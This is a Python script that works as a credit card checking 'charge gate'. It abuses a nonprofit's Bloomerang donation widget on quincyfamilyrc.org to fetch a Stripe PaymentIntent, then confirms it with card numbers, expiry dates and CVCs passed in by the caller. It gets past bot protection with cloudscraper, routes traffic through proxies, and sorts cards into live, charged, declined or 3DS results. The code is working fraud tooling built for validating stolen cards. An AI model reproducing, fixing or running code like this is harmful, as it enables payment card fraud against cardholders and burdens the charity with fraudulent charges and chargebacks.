import cloudscraper
import requests
import json
import re
import random
import string
import uuid
import asyncio

def _detect_card_brand(cc):
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55'): return 'MASTERCARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def check_card_bloomerang_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous Stripe Bloomerang $1.00 Charge Gate (quincyfamilyrc.org) fixed from gay.py chrgeccn.
    Flow:
    1. POST https://api.bloomerang.co/v1/Widget/3729409 (fetch dynamic PaymentIntentId & ClientSecret)
    2. POST https://api.stripe.com/v1/payment_intents/{pi_}/confirm (execute live payment intent)
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"

    s = cloudscraper.create_scraper()
    useragents = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    s.headers.update({'User-Agent': useragents})

    if proxy_url:
        s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Step 1: Fetch Bloomerang Widget PaymentElement
        headers_bloom = {
            'accept': '*/*',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://www.quincyfamilyrc.org',
            'referer': 'https://www.quincyfamilyrc.org/',
            'user-agent': useragents
        }
        params_bloom = {'ApiKey': 'pub_fa6f55a1-d391-11eb-ab84-0253c981a9f9'}
        json_bloom = {
            'ServedSecurely': True,
            'FormUrl': 'https://www.quincyfamilyrc.org/donate/',
            'Logs': []
        }

        r_bloom = s.post('https://api.bloomerang.co/v1/Widget/3729409', params=params_bloom, headers=headers_bloom, json=json_bloom, timeout=15)
        if r_bloom.status_code != 200:
            return "error", f"Bloomerang Widget Failed ({r_bloom.status_code})", "N/A"

        res_bloom = r_bloom.json()
        pe = res_bloom.get('PaymentElement', {})
        pi_ = pe.get('PaymentIntentId')
        client_secret = pe.get('ClientSecret')
        brand = _detect_card_brand(cc)

        if not pi_ or not client_secret:
            return "error", "Failed to extract Stripe PaymentIntent from Bloomerang", brand

        # Step 2: Confirm PaymentIntent on Stripe
        headers_stripe = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': useragents
        }

        data_stripe = {
            "return_url": "https://www.quincyfamilyrc.org/donate/",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": "10001",
            "payment_method_data[guid]": str(uuid.uuid4()),
            "payment_method_data[muid]": str(uuid.uuid4()),
            "payment_method_data[sid]": str(uuid.uuid4()),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_iZYXFefCkt380zu63aqUIo7y",
            "client_secret": client_secret
        }

        r_stripe = s.post(f'https://api.stripe.com/v1/payment_intents/{pi_}/confirm', headers=headers_stripe, data=data_stripe, timeout=20)
        res_json = r_stripe.json()

        if 'error' in res_json:
            err = res_json['error']
            last = ((err.get('payment_intent') or {}).get('last_payment_error') or {})
            err_msg = last.get('message') or err.get('message') or 'Card Declined'
            decline_code = last.get('decline_code') or err.get('decline_code') or last.get('code') or err.get('code')
            
            err_low = err_msg.lower()
            if any(k in err_low for k in ("insufficient", "do not honor", "security code", "incorrect", "cvv", "cvc")):
                return "live", f"Declined - {err_msg}", brand
            
            if decline_code:
                return "declined", f"Declined ({decline_code})", brand
            return "declined", err_msg, brand

        status = res_json.get('status')
        if status == 'succeeded':
            return "charged", "Charge Successful ($1.00)", brand
        elif status in ('requires_action', 'requires_payment_method'):
            return "3ds", "3D Secure / Verification Required", brand
        else:
            return "declined", f"Status: {status}", brand

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_bloomerang(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_bloomerang_sync.
    """
    return await asyncio.to_thread(check_card_bloomerang_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
